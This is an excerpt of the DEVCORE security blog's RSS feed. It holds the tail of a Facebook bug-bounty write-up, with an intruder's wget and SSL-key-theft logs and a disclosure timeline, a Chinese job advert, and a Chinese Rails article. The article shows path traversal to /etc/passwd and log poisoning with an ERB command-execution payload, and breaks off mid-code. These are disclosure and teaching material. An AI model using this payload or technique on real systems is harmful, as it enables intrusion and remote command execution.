Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT&apos;

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-&apos; saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Attempt to steal SSL Private Key&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;After checking the browser, the SSL certificate of files.fb.com was *.fb.com …&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;epilogue&quot;&gt;Epilogue&lt;/h3&gt;

&lt;p&gt;After adequate proofs had been collected, they were immediately reported to Facebook Security Team. Other than vulnerability details accompanying logs, screenshots and timelines were also submitted xD&lt;/p&gt;

&lt;p&gt;Also, from the log on the server, there were two periods that the system was obviously operated by the hacker, one in the beginning of July and one in mid-September&lt;/p&gt;

&lt;p&gt;the July one seemed to be a server “dorking” and the September one seemed more vicious. Other than server “dorking” keyloggers were also implemented. As for the identities of these two hackers, were they the same person? Your guess is as good as mine. :P&lt;br /&gt;
The time July incident happened to take place right before the announcement of CVE-2015-2857 exploit. Whether it was an invasion of 1-day exploitation or unknown 0-day ones were left in question.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Here’s the end of the story, and, generally speaking, it was a rather interesting experience xD&lt;br /&gt;
Thanks to this event, it inspired me to write some articles about penetration :P&lt;/p&gt;

&lt;p&gt;Last but not least, I would like to thank Bug Bounty and tolerant Facebook Security Team so that I could fully write down this incident : )&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/05 20:05 Provide vulnerability details to Facebook Security Team&lt;/li&gt;
  &lt;li&gt;2016/02/05 20:08 Receive automatic response&lt;/li&gt;
  &lt;li&gt;2016/02/06 05:21 Submit vulnerability Advisory to Accellion Support Team&lt;/li&gt;
  &lt;li&gt;2016/02/06 07:42 Receive response from Thomas that inspection is in progress&lt;/li&gt;
  &lt;li&gt;2016/02/13 07:43 Receive response from Reginaldo about receiving Bug Bounty award $10000 USD&lt;/li&gt;
  &lt;li&gt;2016/02/13 Asking if there anything I should pay special attention to in blog post ?&lt;/li&gt;
  &lt;li&gt;2016/02/13 Asking Is this vulnerability be classify as a RCE or SQL Injection ?&lt;/li&gt;
  &lt;li&gt;2016/02/18 Receive response from Reginaldo about there is a forensics investigation, Would you be able to hold your blog post until this process is complete?&lt;/li&gt;
  &lt;li&gt;2016/02/24 Receive response from Hai about the bounty will include in March payments cycle.&lt;/li&gt;
  &lt;li&gt;2016/04/20 Receive response from Reginaldo about the forensics investigation is done&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/</link>
                <guid>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver</guid>
                <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[已結束] DEVCORE 徵求行政出納人才</title>
                <description>&lt;p&gt;（2015.9.16 已結束徵才）&lt;/p&gt;

&lt;p&gt;戴夫寇爾即將要邁入第四個年頭，在過去的歲月中，我們推廣資安的重要性、強調安全開發。我們堅持提供最高品質的滲透測試服務，協助企業找出隱藏的資安威脅。我們也不斷精進技術，期許自己能成為全台灣第一的滲透測試團隊。&lt;/p&gt;

&lt;p&gt;感謝這些年來業界朋友對我們的肯定與支持，戴夫寇爾得以茁壯，如今，我們還需要一位行政出納人才，我們渴望您的加入，做為戴夫寇爾穩定的力量。相關細節如下：&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;工作內容&quot;&gt;工作內容&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;協助處理庶務性行政工作（接聽來電、收發、接待）&lt;/li&gt;
  &lt;li&gt;負責合約管理、出缺考勤管理、帳務明細整理&lt;/li&gt;
  &lt;li&gt;規劃、執行採購庶務&lt;/li&gt;
  &lt;li&gt;應收應付款項與零用金管理&lt;/li&gt;
  &lt;li&gt;銀行往來與一般款項收付作業&lt;/li&gt;
  &lt;li&gt;協助主管執行相關業務&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作時間&quot;&gt;工作時間&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00&lt;/p&gt;

&lt;h3 id=&quot;工作地點&quot;&gt;工作地點&lt;/h3&gt;
&lt;p&gt;台北市中山區復興北路 168 號 10 樓&lt;br /&gt;
（捷運南京復興站，走路約三分鐘）&lt;/p&gt;

&lt;h3 id=&quot;條件要求&quot;&gt;條件要求&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;需有兩年以上相關工作經驗&lt;/li&gt;
  &lt;li&gt;熟悉試算表，具獨立撰寫試算表公式能力&lt;/li&gt;
  &lt;li&gt;習慣使用雲端服務，如：Google Drive, Dropbox 或其他&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;加分條件&quot;&gt;加分條件&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;您使用過專案管理系統，如：Trello, Basecamp, Redmine 或其他&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您將會使用專案管理系統管理平日任務&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;您是 MAC 使用者&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您未來的電腦會是 MAC，我們希望您越快順暢使用電腦越好&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;您曾經做過行政相關職務，但對行政一職有一套自己的想法&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;我們是新創公司，我們歡迎您挑戰既定的行政刻版印象&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;您是生活駭客&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您不需要會寫程式，但您習慣觀察生活中的規律，並想辦法利用這些規律有效率的解決問題&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作環境&quot;&gt;工作環境&lt;/h3&gt;
&lt;p&gt;我們注重公司每個人的身心健康，所以：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;您會在一個開闊的辦公環境工作
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;您會擁有一張 Aeron 人體工學椅
&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;每週補滿飲料（另有咖啡機）、零食，讓您保持心情愉快
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;公司提供飛鏢機讓您發洩對主管的怨氣
&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;員工福利&quot;&gt;員工福利&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;第一年即有特休（照比例），每年度五天全薪病假&lt;/li&gt;
  &lt;li&gt;三節、生日禮金&lt;/li&gt;
  &lt;li&gt;每季員工聚餐&lt;/li&gt;
  &lt;li&gt;每年員工旅遊&lt;/li&gt;
  &lt;li&gt;每年員工健檢&lt;/li&gt;
  &lt;li&gt;勞保、健保、勞退&lt;/li&gt;
  &lt;li&gt;定期專人按摩服務&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;
&lt;p&gt;新台幣 32,000 - 40,000 （保證 14 個月）&lt;/p&gt;

&lt;h3 id=&quot;應徵方式&quot;&gt;應徵方式&lt;/h3&gt;
&lt;p&gt;請來信將您的履歷以 PDF 格式寄到 recruiting@devco.re，標題格式如下：&lt;br /&gt;&lt;strong&gt;[應徵] 行政出納專員 (您的姓名)&lt;/strong&gt;&lt;br /&gt;&lt;br /&gt;我們會在兩週內主動與您聯繫。審查方式會有書審、線上測驗以及面試三個階段。最快將於九月初開始進行第二階段測試，煩請耐心等候。&lt;br /&gt;履歷請控制在兩頁以內，需包含以下內容：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;基本資料&lt;/li&gt;
  &lt;li&gt;學歷&lt;/li&gt;
  &lt;li&gt;工作經歷&lt;/li&gt;
  &lt;li&gt;社群活動經驗&lt;/li&gt;
  &lt;li&gt;特殊事蹟&lt;/li&gt;
  &lt;li&gt;MBTI 職業性格測試結果（請自行尋找線上測驗測試）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;請參考範例示意（&lt;a href=&quot;http://devco.re/assets/files/recruit/Resume_Example.doc&quot;&gt;DOC&lt;/a&gt;、&lt;a href=&quot;http://devco.re/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;http://devco.re/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。&lt;br /&gt;
若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/p&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;
&lt;p&gt;由於最近業務較為忙碌，若有應徵相關問題，請一律使用 Email 聯繫，造成您的不便請見諒。&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;我們選擇優先在部落格公布徵才資訊，是希望您也對安全議題感興趣，即使不懂技術也想為台灣資安盡一點力。如果您除了處理基本事務外還有更多想法，也歡迎與我們聯繫，我們會保留給您發揮的空間與調升薪水。&lt;br /&gt;&lt;br /&gt;
無論如何，我們都感謝您的來信，期待您的加入！&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2015/08/19/devcore-2015-recruit/</link>
                <guid>https://devco.re/blog/2015/08/19/devcore-2015-recruit</guid>
                <pubDate>Wed, 19 Aug 2015 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Rails 動態樣板路徑的風險</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;從安全開發的角度來看，Ruby on Rails 是一套很友善的框架。它從框架層避免了很多過去網站常出現的安全問題，例如使用 ORM 避免大部分的 SQL injection 問題、有內建的 authenticity_token 讓開發者不必特別煩惱 CSRF、從機制面規定開發者使用 Strong Parameter 避免 Mass Assignment、預設轉化危險字元避免 XSS 等…。&lt;/p&gt;

&lt;p&gt;就我們過去&lt;a href=&quot;https://devco.re/services/penetration-test/&quot;&gt;滲透測試&lt;/a&gt;的經驗來說，Rails 網站雖然還是能找到問題，但相對問題較少，而且很少單純因為 Rails 寫法問題拿到系統操作權。而今天要分享的，是在一次滲透測試中比較特別的例子，因為開發者使用了動態樣板路徑(Dynamic Render Paths)的寫法&lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;，最後造成了嚴重的結果。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;動態樣板路徑，OWASP 的&lt;a href=&quot;https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet#Dynamic_Render_Paths&quot;&gt;介紹&lt;/a&gt;是這樣的：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;In Rails, controller actions and views can dynamically determine which view or partial to render by calling the “render” method. If user input is used in or for the template name, an attacker could cause the application to render an arbitrary view, such as an administrative page.&lt;br /&gt;&lt;br /&gt;
Care should be taken when using user input to determine which view to render. If possible, avoid any user input in the name or path to the view.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;OWASP 是說，如果你的樣板路徑是動態產生的，而且使用者可以控制那個樣板路徑，那麼使用者就可以讀取到任意樣板，包含管理介面的樣板。這樣的描述感覺還好，但就我們的發現，這其實是更嚴重的直接存取物件問題(Insecure Direct Object References)，甚至有機會造成遠端命令執行(Remote Code Execution)，怎麼說呢？我們直接看下去。&lt;/p&gt;

&lt;h3 id=&quot;基本細節&quot;&gt;基本細節&lt;/h3&gt;

&lt;p&gt;一個動態樣板路徑的寫法如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# app/controllers/welcome_controller.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WelcomeController&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ApplicationController&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;index&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;index&apos;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;render&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;而 index 的樣板內容是這樣：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/index.html.erb --&amp;gt;&lt;/span&gt;
This is INDEX page.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;另外建一個 demo 樣板做示意：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- app/views/welcome/demo.html.erb --&amp;gt;&lt;/span&gt;
This is DEMO page.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;實際測試，如果我們連到 WelcomeController 的 index action，不帶任何參數會讀取 index 模版。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_index.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_index.png&quot; alt=&quot;Rails render index view&quot; title=&quot;Rails render index view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果帶參數 page=demo，會讀取到 demo 模版。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_demo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_demo.png&quot; alt=&quot;Rails render demo view&quot; title=&quot;Rails render demo view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;所以，如果我們知道管理介面的模版路徑，送出路徑參數就可以讀取到管理介面。這就是 OWASP 所描述的風險，攻擊者得以讀取任意模版。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_admin.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_admin.png&quot; alt=&quot;Rails render admin view&quot; title=&quot;Rails render admin view&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;然而，當我們嘗試送出系統絕對路徑例如 /etc/passwd &lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;，網頁竟然吐出了 /etc/passwd 的內容！這就是之前所述的直接存取物件問題，可以遍歷目錄瀏覽檔案。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_file_traversal.png&quot; alt=&quot;Rails render Insecure Direct Object References&quot; title=&quot;Rails render Insecure Direct Object References&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;進階攻擊&quot;&gt;進階攻擊&lt;/h3&gt;

&lt;p&gt;通常在 Rails 環境下能夠讀取任意檔案，攻擊者會優先尋找 secret_token，目的是變造惡意 session cookie 利用 Marshal serialize 的問題做 &lt;a href=&quot;http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/&quot;&gt;RCE&lt;/a&gt;。然而在本案例系統使用了 Rails 4.1 後的版本，Rails 4.1 預設使用了 JSON-based 的 serializer 防止了之前的 RCE 問題，所以並沒有辦法輕鬆利用。&lt;/p&gt;

&lt;p&gt;為了取得系統操作權，我們嘗試尋找其他可利用的地方。在這邊我們發現了該站系統 production.log 中存在 AWS 的上傳紀錄。如下：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xxxx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&quot;upload_001&quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;於是我們可以利用上傳檔案的 Content-Type 內容，將 Embedded Ruby 語句 &amp;lt;%=`#{params[:devcore]}`%&amp;gt; 添加到 production.log 檔案裡面。於是 log 的內容變成了下面這樣：&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# log/production.log&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.041347&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xxxx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&quot;upload_001&quot;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;INFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;AWS&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;S3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.040211&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;put_object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:acl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:public_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:bucket_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xxxx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12405&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:content_type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;%=`&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:devcore&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;`%&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;#&amp;lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&amp;gt;,:key=&amp;gt;&quot;upload_002&quot;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;接著，我們就可以利用前面的弱點讀取 production.log 檔案，再帶一個 devcore 參數作為指令，如圖，成功取得系統操作權 :p&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20150724/render_RCE.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20150724/render_RCE.png&quot; alt=&quot;Rails render Remote Code Execution&quot; title=&quot;Rails render Remote Code Execution&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;風險原因&quot;&gt;風險原因&lt;/h3&gt;

&lt;p&gt;一般來說 Rails 開發並不太會這樣寫，但稍微搜尋一下 Github 還是能發現這種寫法存在一些專案中。我想主要原因多半是開發者想要偷懶，然後也可能想說動態樣板路徑頂多就被看到面板的 html，無傷大雅。誰知道就因為這樣導致整個程式碼內容被讀取。&lt;/p&gt;

&lt;p&gt;若有一個 action 要動態顯示不同模版的需求，為了避免上述的問題，就辛苦點先用 case…when 去判斷吧。這跟不要用字串組 SQL 語句避免 SQL injection 一樣，這種外面傳進來的參數都要謹慎處理的觀念要內化在開發中。&lt;/p&gt;

&lt;p&gt;除了開發者基本上不應該這樣開發外，Rails 本身也有一點點問題，當 render 路徑沒有副檔名，無法判斷什麼格式時，就會直接採用預設的 template handler。&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;c1&quot;&gt;# lib/action_view/template/resolver.rb&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;extract_handler_and_format_and_variant&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;default_formats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
